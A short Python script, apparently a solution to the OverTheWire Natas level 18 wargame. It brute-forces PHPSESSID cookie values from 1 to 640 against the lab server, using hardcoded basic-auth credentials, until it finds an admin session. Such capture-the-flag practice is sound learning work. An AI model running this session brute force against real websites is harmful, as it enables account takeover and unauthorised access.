import requests

auth = ('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
url = 'http://natas18.natas.labs.overthewire.org/index.php'
fail_str = 'You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.'

for x in range(1, 641):
    r = requests.get(url, auth=auth, cookies={'PHPSESSID': str(x)})

    if fail_str not in r.text:
        print(r.text)
        print(x)
        break

